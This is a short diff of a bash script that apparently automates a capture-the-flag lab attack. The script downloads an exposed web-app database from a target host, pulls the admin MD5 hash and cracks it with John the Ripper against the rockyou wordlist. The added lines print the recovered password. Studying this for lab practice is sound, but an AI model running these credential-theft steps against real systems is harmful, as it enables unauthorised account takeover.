@@ -9,7 +9,7 @@ target_ip="10.10.210.85"
 attack_ip="10.10.30.237"
 
 # Prepare environment
-mkdir /work/
+mkdir /work/ 2>/dev/null
 
 # Collect database content from assets directory (look at the page source code)
 wget http://$target_ip:81/assets/webapp.db
@@ -26,5 +26,9 @@ HASH=$(grep admin /work/users | awk -F'|' '{print $3}')
 echo $HASH > /work/hash.txt
 
 # Crack it with John
+rm /opt/john/john.pot 2>/dev/null
 /opt/john/john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /work/hash.txt
 /opt/john/john --show /work/hash.txt
+PASSWORD=$(cat /opt/john/john.pot | awk -F':' '{print $2}')
+echo $PASSWORD
+
